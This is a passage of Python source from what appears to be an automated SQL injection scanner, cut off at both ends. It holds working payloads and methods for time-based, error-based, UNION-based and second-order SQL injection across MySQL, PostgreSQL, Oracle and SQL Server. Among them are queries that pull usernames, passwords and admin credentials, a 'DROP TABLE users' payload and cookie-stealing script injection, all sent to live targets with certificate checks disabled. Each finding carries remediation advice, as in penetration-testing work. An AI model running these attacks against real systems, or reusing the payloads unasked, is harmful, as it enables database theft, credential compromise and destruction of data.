                        'evidence': 'Request timeout on time-based payload',
                        'attack_vector': 'ORDER BY time-based blind SQL injection',
                        'impact': 'Confirmed time-based SQL injection vulnerability',
                        'case_study': 'Marx Chryz working payload confirmation',
                        'remediation': 'Immediate patching required - use parameterized queries',
                        'status_code': 'Timeout'
                    }
                    results.append(vuln)
                    print(f"{Fore.RED}[!] CRITICAL: ORDER BY Time-based SQLi (Timeout): {url} (param: {param}){Style.RESET_ALL}")
            except Exception:
                continue
        
        return results
    
    def test_mysql_version_enum(self, url):
        """Test MySQL version enumeration using comment syntax (Marx Chryz technique)"""
        results = []
        
        # MySQL version ranges to test (from case study: determined MySQL 5.7.31)
        version_tests = [
            ('50000', 'MySQL 5.0+'),
            ('50100', 'MySQL 5.1+'),
            ('50500', 'MySQL 5.5+'),
            ('50600', 'MySQL 5.6+'),
            ('50700', 'MySQL 5.7+'),
            ('50731', 'MySQL 5.7.31+'),  # Specific version from case study
            ('50732', 'MySQL 5.7.32+'),
            ('80000', 'MySQL 8.0+'),
            ('80018', 'MySQL 8.0.18+')
        ]
        
        detected_version = None
        
        print(f"{Fore.CYAN}[*] Enumerating MySQL version using comment syntax...{Style.RESET_ALL}")
        
        for version_num, version_desc in version_tests:
            try:
                # Use invalid SQL syntax within version-specific comment
                test_params = {
                    'order': f'/*!{version_num}someInvalidSQLSyntax*/',
                    'ordering': 'ASC'
                }
                
                response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                
                # If we get error 500, this version or higher is supported
                # If we get success 200, this version is NOT supported
                if response.status_code == 500 and not detected_version:
                    detected_version = version_desc
                    
                    vuln = {
                        'type': 'MySQL Version Information Disclosure',
                        'severity': 'Low',
                        'url': url,
                        'parameter': 'order',
                        'payload': test_params['order'],
                        'evidence': f'MySQL version detected: {version_desc}',
                        'attack_vector': 'Version-specific SQL comment syntax enumeration',
                        'impact': 'Database version disclosure aids in targeted attacks',
                        'case_study': 'Marx Chryz MySQL version enumeration technique',
                        'detected_version': version_desc,
                        'remediation': 'Suppress database version information, implement proper error handling',
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.GREEN}[+] MySQL version detected: {version_desc} via comment syntax{Style.RESET_ALL}")
                    break
                    
            except Exception:
                continue
        
        if not detected_version:
            print(f"{Fore.YELLOW}[*] MySQL version enumeration unsuccessful or not MySQL database{Style.RESET_ALL}")
        
        return results
    
    def comprehensive_database_fingerprinting(self, url):
        """Comprehensive database fingerprinting using guide techniques"""
        results = []
        detected_db = None
        
        print(f"{Fore.CYAN}[*] Starting comprehensive database fingerprinting...{Style.RESET_ALL}")
        
        # Database fingerprinting payloads (from comprehensive guide)
        db_fingerprint_tests = {
            'MySQL': [
                "SELECT @@version",
                "' UNION SELECT @@version--",
                "' AND @@version LIKE '%mysql%'--",
                "' UNION SELECT version()--",
                "CONCAT('mysql','test')"
            ],
            'PostgreSQL': [
                "SELECT version()",
                "' UNION SELECT version()--", 
                "' AND version() LIKE '%PostgreSQL%'--",
                "SELECT current_database()",
                "'foo'||'bar'"
            ],
            'Oracle': [
                "SELECT banner FROM v$version",
                "' UNION SELECT banner FROM v$version--",
                "SELECT * FROM dual",
                "' AND ROWNUM=1--",
                "'foo'||'bar'"
            ],
            'Microsoft SQL Server': [
                "SELECT @@version",
                "' UNION SELECT @@version--",
                "SELECT DB_NAME()",
                "SELECT USER_NAME()",
                "'foo'+'bar'"
            ],
            'SQLite': [
                "SELECT sqlite_version()",
                "' UNION SELECT sqlite_version()--",
                "SELECT name FROM sqlite_master",
                "' AND sqlite_version() IS NOT NULL--"
            ]
        }
        
        for db_type, payloads in db_fingerprint_tests.items():
            for payload in payloads:
                try:
                    test_params = {'test': payload}
                    response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                    
                    # Check for database-specific indicators in response
                    response_text = response.text.lower()
                    
                    db_indicators = {
                        'MySQL': ['mysql', 'mariadb', '@@version', 'concat(', 'information_schema'],
                        'PostgreSQL': ['postgresql', 'postgres', 'current_database', 'pg_', 'version()'],
                        'Oracle': ['oracle', 'dual', 'v$version', 'rownum', 'sys.'],
                        'Microsoft SQL Server': ['microsoft', 'sql server', 'db_name', 'user_name', 'master..'],
                        'SQLite': ['sqlite', 'sqlite_version', 'sqlite_master']
                    }
                    
                    for db_name, indicators in db_indicators.items():
                        if any(indicator in response_text for indicator in indicators):
                            if not detected_db:
                                detected_db = db_name
                                
                                vuln = {
                                    'type': 'Database Type Disclosure',
                                    'severity': 'Low',
                                    'url': url,
                                    'payload': payload,
                                    'evidence': f'Database type detected: {db_name}',
                                    'detected_database': db_name,
                                    'fingerprint_method': 'Response pattern analysis',
                                    'impact': 'Database type disclosure enables targeted attacks',
                                    'remediation': 'Suppress database-specific error messages and information',
                                    'status_code': response.status_code
                                }
                                results.append(vuln)
                                print(f"{Fore.GREEN}[+] Database detected: {db_name}{Style.RESET_ALL}")
                                
                                # Test database-specific payloads
                                if db_name.lower().replace(' ', '') in [k.lower().replace(' ', '') for k in self.db_specific_payloads.keys()]:
                                    db_key = next(k for k in self.db_specific_payloads.keys() 
                                                if k.lower().replace(' ', '') == db_name.lower().replace(' ', ''))
                                    specific_results = self.test_database_specific_payloads(url, db_key)
                                    results.extend(specific_results)
                                
                                break
                                
                except Exception:
                    continue
                
                if detected_db:
                    break
            
            if detected_db:
                break
        
        if not detected_db:
            print(f"{Fore.YELLOW}[*] Database fingerprinting unsuccessful - using generic payloads{Style.RESET_ALL}")
        
        return results
    
    def test_database_specific_payloads(self, url, db_type):
        """Test database-specific payloads once database type is identified"""
        results = []
        
        if db_type not in self.db_specific_payloads:
            return results
            
        print(f"{Fore.CYAN}[*] Testing {db_type.upper()}-specific SQL injection payloads...{Style.RESET_ALL}")
        
        for payload in self.db_specific_payloads[db_type]:
            try:
                test_params = {'test': payload}
                start_time = time.time()
                response = requests.get(url, params=test_params, timeout=self.timeout + 15, verify=False)
                end_time = time.time()
                response_time = end_time - start_time
                
                # Database-specific vulnerability detection
                if 'sleep' in payload.lower() or 'waitfor' in payload.lower() or 'pg_sleep' in payload.lower():
                    if response_time >= 4:  # Time-based detection
                        vuln = {
                            'type': f'{db_type.title()} Time-based Blind SQL Injection',
                            'severity': 'Critical',
                            'url': url,
                            'payload': payload,
                            'evidence': f'Database-specific time delay: {response_time:.2f} seconds',
                            'database_type': db_type,
                            'response_time': response_time,
                            'attack_vector': f'{db_type}-specific time-based blind injection',
                            'impact': 'Database-specific exploitation possible, data exfiltration risk',
                            'remediation': 'Use parameterized queries, validate input, implement proper error handling',
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        notify_vulnerability(vuln)
                        print(f"{Fore.RED}[!] CRITICAL: {db_type} time-based SQLi: {url}{Style.RESET_ALL}")
                
                # Check for database-specific error patterns
                db_error_patterns = {
                    'mysql': ['mysql error', 'you have an error in your sql syntax', 'warning: mysql'],
                    'postgresql': ['postgresql error', 'invalid input syntax', 'error: syntax error'],
                    'oracle': ['ora-', 'oracle error', 'pl/sql'],
                    'mssql': ['microsoft odbc', 'sql server', 'oledb provider']
                }
                
                if db_type in db_error_patterns:
                    response_text = response.text.lower()
                    for error_pattern in db_error_patterns[db_type]:
                        if error_pattern in response_text:
                            vuln = {
                                'type': f'{db_type.title()} Error-based SQL Injection',
                                'severity': 'High',
                                'url': url,
                                'payload': payload,
                                'evidence': f'Database-specific error pattern: {error_pattern}',
                                'database_type': db_type,
                                'attack_vector': f'{db_type}-specific error-based injection',
                                'impact': 'Database error information disclosure, potential data extraction',
                                'remediation': 'Implement proper error handling, use parameterized queries',
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            notify_vulnerability(vuln)
                            print(f"{Fore.YELLOW}[!] {db_type} error-based SQLi: {url}{Style.RESET_ALL}")
                            break
                
            except requests.exceptions.Timeout:
                # Timeout indicates successful time-based injection
                if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                    vuln = {
                        'type': f'{db_type.title()} Time-based SQL Injection (Timeout)',
                        'severity': 'Critical',
                        'url': url,
                        'payload': payload,
                        'evidence': 'Request timeout on database-specific time payload',
                        'database_type': db_type,
                        'attack_vector': f'Confirmed {db_type} time-based injection',
                        'impact': 'Database-specific time-based injection confirmed',
                        'remediation': 'Critical fix required - implement parameterized queries',
                        'response_time': 'Timeout'
                    }
                    results.append(vuln)
                    notify_vulnerability(vuln)
                    print(f"{Fore.RED}[!] CRITICAL: {db_type} time-based SQLi (Timeout): {url}{Style.RESET_ALL}")
            except Exception:
                continue
        
        return results
    
    def examine_database_contents(self, url, param, method='GET'):
        """
        Comprehensive database content examination using UNION-based SQLi
        Based on professional security guide for listing tables and columns
        """
        results = []
        
        print(f"{Fore.CYAN}[*] Starting database content examination...{Style.RESET_ALL}")
        
        # Database-specific table listing queries
        table_listing_queries = {
            'MySQL': [
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT table_name,table_schema FROM information_schema.tables--",
                "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT 1,table_name FROM information_schema.tables--",
                "' UNION SELECT table_name,2 FROM information_schema.tables LIMIT 10--"
            ],
            'PostgreSQL': [
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT tablename FROM pg_tables--",
                "' UNION SELECT table_name,table_schema FROM information_schema.tables--",
                "' UNION SELECT 1,table_name FROM information_schema.tables--"
            ],
            'Microsoft SQL Server': [
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                "' UNION SELECT table_name,table_schema FROM information_schema.tables--",
                "' UNION SELECT 1,table_name FROM information_schema.tables--"
            ],
            'Oracle': [
                "' UNION SELECT table_name FROM all_tables--",
                "' UNION SELECT table_name FROM user_tables--",
                "' UNION SELECT 1,table_name FROM all_tables WHERE ROWNUM<=10--",
                "' UNION SELECT table_name,owner FROM all_tables--"
            ]
        }
        
        # Database-specific column listing queries
        column_listing_queries = {
            'MySQL': [
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='admin'--",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_schema=database()--"
            ],
            'PostgreSQL': [
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT attname FROM pg_attribute WHERE attrelid=(SELECT oid FROM pg_class WHERE relname='users')--"
            ],
            'Microsoft SQL Server': [
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--"
            ],
            'Oracle': [
                "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--",
                "' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name='USERS'--",
                "' UNION SELECT 1,column_name FROM all_tab_columns WHERE table_name='ADMIN'--"
            ]
        }
        
        # Database version detection queries (professional guide)
        version_detection_queries = {
            'MySQL': [
                "' UNION SELECT @@version--",
                "' UNION SELECT version()--",
                "' UNION SELECT @@version_comment--"
            ],
            'PostgreSQL': [
                "' UNION SELECT version()--",
                "' UNION SELECT current_setting('server_version')--"
            ],
            'Microsoft SQL Server': [
                "' UNION SELECT @@version--",
                "' UNION SELECT SERVERPROPERTY('productversion')--",
                "' UNION SELECT DB_NAME()--",
                "' UNION SELECT USER_NAME()--"
            ],
            'Oracle': [
                "' UNION SELECT banner FROM v$version--",
                "' UNION SELECT version FROM product_component_version--",
                "' UNION SELECT * FROM dual--"
            ]
        }
        
        all_queries = {}
        all_queries.update(table_listing_queries)
        all_queries.update(column_listing_queries) 
        all_queries.update(version_detection_queries)
        
        for db_type, queries in all_queries.items():
            print(f"{Fore.YELLOW}[*] Testing {db_type} database examination...{Style.RESET_ALL}")
            
            for query in queries:
                try:
                    # Test the UNION-based information extraction
                    if method.upper() == 'GET':
                        test_params = {param: query}
                        response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                    else:
                        test_data = {param: query}
                        response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                    
                    # Look for database structure information in response
                    response_lower = response.text.lower()
                    
                    # Check for successful table/column enumeration
                    info_indicators = [
                        'table_name', 'column_name', 'information_schema', 'sysobjects',
                        'pg_tables', 'all_tables', 'user_tables', 'all_tab_columns',
                        'mysql', 'postgresql', 'oracle', 'microsoft sql server',
                        'version', 'database', 'schema', 'users', 'admin', 'accounts'
                    ]
                    
                    found_indicators = [indicator for indicator in info_indicators if indicator in response_lower]
                    
                    if len(found_indicators) >= 2:  # Multiple indicators suggest successful enumeration
                        vuln = {
                            'type': f'{db_type} Database Information Disclosure',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': param,
                            'payload': query,
                            'method': method,
                            'database_type': db_type,
                            'evidence': f'Database information disclosed: {", ".join(found_indicators[:5])}',
                            'attack_vector': 'UNION-based SQL injection for database enumeration',
                            'impact': 'Database structure disclosure, potential sensitive data access',
                            'remediation': 'Implement parameterized queries, restrict database permissions',
                            'response_length': len(response.text),
                            'status_code': response.status_code,
                            'extracted_info': found_indicators
                        }
                        results.append(vuln)
                        notify_vulnerability(vuln)
                        print(f"{Fore.RED}[!] {db_type} database info disclosed: {url}{Style.RESET_ALL}")
                        print(f"    Found indicators: {', '.join(found_indicators[:3])}...")
                        
                        # Extract specific table/column names if possible
                        self.extract_database_details(response.text, db_type, query, vuln)
                
                except Exception as e:
                    continue
        
        if results:
            print(f"{Fore.GREEN}[+] Database examination completed: {len(results)} disclosures found{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No database information disclosure detected{Style.RESET_ALL}")
            
        return results
    
    def extract_database_details(self, response_text, db_type, query, vuln_info):
        """Extract specific database details from successful UNION queries"""
        
        # Common table names to look for
        sensitive_tables = ['users', 'admin', 'accounts', 'customer', 'payment', 'orders', 'products']
        
        # Common column names to look for  
        sensitive_columns = ['password', 'email', 'username', 'user_id', 'credit_card', 'ssn', 'token', 'api_key']
        
        found_tables = []
        found_columns = []
        
        response_lower = response_text.lower()
        
        # Extract table names
        for table in sensitive_tables:
            if table in response_lower:
                found_tables.append(table)
        
        # Extract column names
        for column in sensitive_columns:
            if column in response_lower:
                found_columns.append(column)
        
        if found_tables:
            print(f"{Fore.CYAN}    [+] Sensitive tables found: {', '.join(found_tables)}{Style.RESET_ALL}")
            vuln_info['sensitive_tables'] = found_tables
            
        if found_columns:
            print(f"{Fore.CYAN}    [+] Sensitive columns found: {', '.join(found_columns)}{Style.RESET_ALL}")
            vuln_info['sensitive_columns'] = found_columns
    
    def test_second_order_sqli(self, url):
        """
        Test for Second-Order (Stored) SQL Injection vulnerabilities
        These occur when user input is stored and later used in SQL queries without proper sanitization
        """
        results = []
        
        print(f"{Fore.CYAN}[*] Testing Second-Order SQL Injection...{Style.RESET_ALL}")
        
        # Second-order SQLi payloads designed to be stored and trigger later
        second_order_payloads = [
            # Basic stored payloads
            "admin'--",
            "admin'/*",
            "admin' OR '1'='1'/*",
            "admin' UNION SELECT 1,2,3--",
            
            # Time-based stored payloads
            "admin'; WAITFOR DELAY '00:00:05'--",
            "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "admin' OR pg_sleep(5)--",
            
            # Error-based stored payloads
            "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "admin' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Data extraction payloads for later retrieval
            "admin' UNION SELECT @@version,user(),database()--",
            "admin' UNION SELECT table_name FROM information_schema.tables--",
            
            # XSS + SQLi combination for second-order
            "<script>alert('SQLi')</script>' OR '1'='1",
            "test'><script>alert(document.cookie)</script>' OR '1'='1--",
            
            # Comment manipulation
            "Regular comment'; DROP TABLE users;--",
            "Normal input' UNION SELECT password FROM users WHERE username='admin'--"
        ]
        
        # Common endpoints that might store and later process user input
        storage_endpoints = [
            '/register', '/signup', '/profile', '/update', '/edit',
            '/comment', '/review', '/feedback', '/contact', '/message',
            '/settings', '/preferences', '/account', '/user', '/admin',
            '/api/user', '/api/profile', '/api/register', '/api/update'
        ]
        
        # Parameters commonly used for storing user data
        storage_parameters = [
            'username', 'email', 'name', 'fullname', 'first_name', 'last_name',
            'comment', 'message', 'description', 'bio', 'about', 'content',
            'address', 'city', 'phone', 'company', 'title', 'note'
        ]
        
        for endpoint in storage_endpoints:
            test_url = f"{url.rstrip('/')}{endpoint}"
            
            for param in storage_parameters:
                for payload in second_order_payloads:
                    try:
                        # Step 1: Store the malicious payload
                        store_data = {param: payload}
                        
                        # Try to store the payload via POST
                        store_response = requests.post(test_url, data=store_data, timeout=self.timeout, verify=False)
                        
                        # Step 2: Try to trigger the stored payload by accessing profile/admin pages
                        trigger_endpoints = [
                            '/profile', '/admin', '/dashboard', '/account',
                            '/user/profile', '/admin/users', '/manage',
                            f'/user/{payload.split("'")[0]}',  # User-specific pages
                            '/search', '/list', '/view'
                        ]
                        
                        for trigger_endpoint in trigger_endpoints:
                            trigger_url = f"{url.rstrip('/')}{trigger_endpoint}"
                            
                            try:
                                # Measure response time for time-based detection
                                start_time = time.time()
                                trigger_response = requests.get(trigger_url, timeout=self.timeout, verify=False)
                                response_time = time.time() - start_time
                                
                                # Check for SQL errors in triggered response
                                for pattern in self.error_patterns:
                                    if re.search(pattern, trigger_response.text, re.IGNORECASE):
                                        vuln = {
                                            'type': 'Second-Order SQL Injection',
                                            'severity': 'Critical',
                                            'storage_url': test_url,
                                            'trigger_url': trigger_url,
                                            'parameter': param,
                                            'payload': payload,
                                            'evidence': f"SQL error pattern triggered: {pattern}",
                                            'attack_vector': 'Stored input triggers SQLi on retrieval',
                                            'impact': 'Delayed SQL injection execution, potential data breach',
                                            'remediation': 'Sanitize input on storage AND retrieval, use parameterized queries',
                                            'response_length': len(trigger_response.text),
                                            'status_code': trigger_response.status_code,
                                            'storage_method': 'POST',
                                            'trigger_method': 'GET'
                                        }
                                        results.append(vuln)
                                        notify_vulnerability(vuln)
                                        print(f"{Fore.RED}[!] Second-Order SQLi: Store at {test_url}, Trigger at {trigger_url}{Style.RESET_ALL}")
                                        break
                                
                                # Check for time-based second-order injection
                                if any(sleep_keyword in payload.lower() for sleep_keyword in ['sleep', 'waitfor', 'pg_sleep']) and response_time >= 4:
                                    vuln = {
                                        'type': 'Second-Order Time-based SQL Injection',
                                        'severity': 'Critical',
                                        'storage_url': test_url,
                                        'trigger_url': trigger_url,
                                        'parameter': param,
                                        'payload': payload,
                                        'evidence': f'Time delay triggered: {response_time:.2f}s',
                                        'attack_vector': 'Stored time-based blind SQL injection',
                                        'impact': 'Confirmed second-order SQL injection with time delays',
                                        'remediation': 'Critical: Sanitize stored data before use in SQL queries',
                                        'response_time': response_time,
                                        'storage_method': 'POST',
                                        'trigger_method': 'GET'
                                    }
                                    results.append(vuln)
                                    notify_vulnerability(vuln)
                                    print(f"{Fore.RED}[!] Second-Order Time-based SQLi: {trigger_url} ({response_time:.2f}s){Style.RESET_ALL}")
                                
                            except requests.exceptions.Timeout:
                                # Timeout on trigger indicates successful second-order time-based injection
                                if any(sleep_keyword in payload.lower() for sleep_keyword in ['sleep', 'waitfor', 'pg_sleep']):
                                    vuln = {
                                        'type': 'Second-Order Time-based SQL Injection (Timeout)',
                                        'severity': 'Critical',
                                        'storage_url': test_url,
                                        'trigger_url': trigger_url,
                                        'parameter': param,
                                        'payload': payload,
                                        'evidence': 'Request timeout on stored time-based payload',
                                        'attack_vector': 'Confirmed second-order time-based injection',
                                        'impact': 'Critical second-order SQL injection confirmed',
                                        'remediation': 'Immediate fix required for stored data handling',
                                        'response_time': 'Timeout'
                                    }
                                    results.append(vuln)
                                    notify_vulnerability(vuln)
                                    print(f"{Fore.RED}[!] CRITICAL: Second-Order SQLi Timeout: {trigger_url}{Style.RESET_ALL}")
                            
                            except Exception:
                                continue
                                
                    except Exception:
                        continue
        
        if results:
            print(f"{Fore.GREEN}[+] Second-Order SQL Injection testing completed: {len(results)} vulnerabilities found{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No Second-Order SQL injection vulnerabilities detected{Style.RESET_ALL}")
            
        return results
    
    def test_union_based_sqli(self, url, param, method='GET'):
        """
        Comprehensive UNION-based SQL injection testing
        Based on professional security guide methodology
        """
        results = []
        
        print(f"{Fore.CYAN}[*] Starting UNION-based SQL injection testing...{Style.RESET_ALL}")
        
        # Step 1: Determine number of columns using ORDER BY method
        column_count = self.determine_column_count_order_by(url, param, method)
        
        if not column_count:
            # Step 2: Fallback to UNION SELECT NULL method
            column_count = self.determine_column_count_union_null(url, param, method)
        
        if column_count:
            print(f"{Fore.GREEN}[+] Detected {column_count} columns in query{Style.RESET_ALL}")
            
            # Step 3: Find columns with string data type compatibility
            string_columns = self.find_string_compatible_columns(url, param, method, column_count)
            
            if string_columns:
                print(f"{Fore.GREEN}[+] String-compatible columns found: {string_columns}{Style.RESET_ALL}")
                
                # Step 4: Retrieve interesting data using UNION attacks
                union_vulns = self.retrieve_data_via_union(url, param, method, column_count, string_columns)
                results.extend(union_vulns)
            else:
                print(f"{Fore.YELLOW}[*] No string-compatible columns detected{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] Could not determine column count for UNION attack{Style.RESET_ALL}")
        
        return results
    
    def determine_column_count_order_by(self, url, param, method):
        """Determine column count using ORDER BY method"""
        print(f"{Fore.CYAN}[*] Testing column count with ORDER BY method...{Style.RESET_ALL}")
        
        for i in range(1, 21):  # Test up to 20 columns
            order_by_payload = f"' ORDER BY {i}--"
            
            try:
                if method.upper() == 'GET':
                    test_params = {param: order_by_payload}
                    response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                else:
                    test_data = {param: order_by_payload}
                    response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                
                # Check for ORDER BY specific error patterns
                order_by_errors = [
                    r"ORDER BY position number \d+ is out of range",
                    r"column.*out of range", r"invalid column.*order by",
                    r"ORDER BY.*position.*invalid", r"unknown column.*order",
                    r"bad column number", r"column reference.*out of range"
                ]
                
                for error_pattern in order_by_errors:
                    if re.search(error_pattern, response.text, re.IGNORECASE):
                        print(f"{Fore.GREEN}[+] Column count determined via ORDER BY: {i-1}{Style.RESET_ALL}")
                        return i - 1
                        
                # Also check for general SQL errors that might indicate column limit
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE) and i > 1:
                        return i - 1
                        
            except Exception:
                continue
        
        return None
    
    def determine_column_count_union_null(self, url, param, method):
        """Determine column count using UNION SELECT NULL method"""
        print(f"{Fore.CYAN}[*] Testing column count with UNION SELECT NULL method...{Style.RESET_ALL}")
        
        # Database-specific UNION NULL payloads
        union_null_templates = {
            'standard': "' UNION SELECT {}--",
            'oracle': "' UNION SELECT {} FROM DUAL--",
            'mysql_hash': "' UNION SELECT {}#",
            'mysql_space': "' UNION SELECT {} -- "
        }
        
        for i in range(1, 21):  # Test up to 20 columns
            null_values = ','.join(['NULL'] * i)
            
            for db_type, template in union_null_templates.items():
                union_payload = template.format(null_values)
                
                try:
                    if method.upper() == 'GET':
                        test_params = {param: union_payload}
                        response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                    else:
                        test_data = {param: union_payload}
                        response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                    
                    # Check for UNION-specific error patterns
                    union_errors = [
                        r"queries.*using.*UNION.*must have.*equal number",
                        r"UNION.*equal number of expressions", 
                        r"number of columns.*differ.*UNION",
                        r"UNION.*column.*mismatch", r"UNION.*different number"
                    ]
                    
                    has_union_error = any(re.search(error, response.text, re.IGNORECASE) for error in union_errors)
                    
                    if not has_union_error and i > 1:
                        # No UNION error suggests we found the correct column count
                        print(f"{Fore.GREEN}[+] Column count determined via UNION NULL ({db_type}): {i}{Style.RESET_ALL}")
                        return i
                    
                except Exception:
                    continue
        
        return None
    
    def find_string_compatible_columns(self, url, param, method, column_count):
        """Find columns compatible with string data type"""
        print(f"{Fore.CYAN}[*] Testing string compatibility for {column_count} columns...{Style.RESET_ALL}")
        
        string_columns = []
        
        # Database-specific templates for string testing
        string_test_templates = {
            'standard': "' UNION SELECT {}--",
            'oracle': "' UNION SELECT {} FROM DUAL--", 
            'mysql_hash': "' UNION SELECT {}#",
            'mysql_space': "' UNION SELECT {} -- "
        }
        
        for col_index in range(column_count):
            # Create payload with test string in current column position and NULL in others
            column_values = ['NULL'] * column_count
            column_values[col_index] = "'zeroHackTest'"
            
            for db_type, template in string_test_templates.items():
                test_payload = template.format(','.join(column_values))
                
                try:
                    if method.upper() == 'GET':
                        test_params = {param: test_payload}
                        response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                    else:
                        test_data = {param: test_payload}
                        response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                    
                    # Check for string conversion errors
                    string_errors = [
                        r"converting.*varchar.*to.*int", r"invalid.*integer",
                        r"cannot convert.*string", r"type.*mismatch", 
                        r"conversion.*failed", r"incompatible.*data.*type"
                    ]
                    
                    has_string_error = any(re.search(error, response.text, re.IGNORECASE) for error in string_errors)
                    
                    if not has_string_error:
                        # Check if our test string appears in response
                        if 'zerohacktest' in response.text.lower():
                            if col_index + 1 not in string_columns:
                                string_columns.append(col_index + 1)
                                print(f"{Fore.GREEN}[+] Column {col_index + 1} accepts string data{Style.RESET_ALL}")
                            break
                        # Even if test string doesn't appear, no error suggests string compatibility
                        elif col_index + 1 not in string_columns:
                            string_columns.append(col_index + 1)
                            break
                    
                except Exception:
                    continue
        
        return string_columns
    
    def retrieve_data_via_union(self, url, param, method, column_count, string_columns):
        """Retrieve sensitive data using UNION-based attacks"""
        results = []
        
        print(f"{Fore.CYAN}[*] Attempting data retrieval via UNION attacks...{Style.RESET_ALL}")
        
        # Database-specific data extraction queries with concatenation for multiple values
        data_extraction_queries = {
            'MySQL': {
                'version_info': 'SELECT CONCAT(@@version,":",user(),":",database())',
                'table_list': 'SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()',
                'user_data': 'SELECT GROUP_CONCAT(CONCAT(username,":",password)) FROM users',
                'admin_creds': 'SELECT CONCAT(username,"~",password) FROM users WHERE username LIKE "%admin%" LIMIT 1'
            },
            'PostgreSQL': {
                'version_info': 'SELECT version()||":"||current_user||":"||current_database()',
                'table_list': 'SELECT string_agg(table_name,",") FROM information_schema.tables',
                'user_data': 'SELECT string_agg(username||":"||password,",") FROM users',
                'admin_creds': 'SELECT username||"~"||password FROM users WHERE username LIKE "%admin%" LIMIT 1'
            },
            'Oracle': {
                'version_info': 'SELECT banner FROM v$version WHERE ROWNUM=1',
                'table_list': 'SELECT LISTAGG(table_name,",") FROM all_tables WHERE ROWNUM<=10',
                'user_data': 'SELECT username||":"||password FROM users WHERE ROWNUM<=5',
                'admin_creds': 'SELECT username||"~"||password FROM users WHERE username LIKE "%ADMIN%" AND ROWNUM=1'
            },
            'MSSQL': {
                'version_info': 'SELECT @@version+":"+USER_NAME()+":"+DB_NAME()',
                'table_list': 'SELECT STUFF((SELECT ","+name FROM sysobjects WHERE xtype="U" FOR XML PATH("")),1,1,"")',
                'user_data': 'SELECT TOP 5 username+":"+password FROM users',
                'admin_creds': 'SELECT TOP 1 username+"~"+password FROM users WHERE username LIKE "%admin%"'
            }
        }
        
        # Test different database types and queries
        for db_type, queries in data_extraction_queries.items():
            for query_name, extraction_query in queries.items():
                
                # Use first string-compatible column for data extraction
                target_column = string_columns[0] - 1  # Convert to 0-based index
                
                # Create UNION payload with extraction query in string column
                column_values = ['NULL'] * column_count
                column_values[target_column] = f'({extraction_query})'
                
                # Database-specific UNION templates
                union_templates = {
                    'MySQL': "' UNION SELECT {}-- ",
                    'PostgreSQL': "' UNION SELECT {}--",
                    'Oracle': "' UNION SELECT {} FROM DUAL--",
                    'MSSQL': "' UNION SELECT {}--"
                }
                
                if db_type in union_templates:
                    union_payload = union_templates[db_type].format(','.join(column_values))
                    
                    try:
                        if method.upper() == 'GET':
                            test_params = {param: union_payload}
                            response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                        else:
                            test_data = {param: union_payload}
                            response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                        
                        # Look for signs of successful data extraction
                        success_indicators = {
                            'version_info': ['mysql', 'postgresql', 'oracle', 'microsoft', 'version', 'database', ':'],
                            'table_list': ['users', 'accounts', 'customers', 'orders', 'products', 'admin', ','],
                            'user_data': ['admin:', 'user:', 'password', 'hash', ':', ','],
                            'admin_creds': ['admin~', 'administrator~', '~password', '~hash', '~']
                        }
                        
                        if query_name in success_indicators:
                            response_lower = response.text.lower()
                            found_indicators = [ind for ind in success_indicators[query_name] if ind in response_lower]
                            
                            if len(found_indicators) >= 2:  # Require multiple indicators for confidence
                                vuln = {
                                    'type': f'{db_type} UNION-based SQL Injection - Data Extraction',
                                    'severity': 'Critical',
                                    'url': url,
                                    'parameter': param,
                                    'payload': union_payload,
                                    'method': method,
                                    'database_type': db_type,
                                    'extracted_data_type': query_name,
                                    'evidence': f'Successfully extracted {query_name}: {", ".join(found_indicators)}',
                                    'attack_vector': f'UNION-based data extraction using {column_count} columns',
                                    'impact': f'Critical data disclosure: {query_name} information extracted via UNION attack',
                                    'remediation': 'Implement parameterized queries, validate input, restrict database permissions',
                                    'column_count': column_count,
                                    'string_columns': string_columns,
                                    'extracted_indicators': found_indicators,
                                    'response_length': len(response.text),
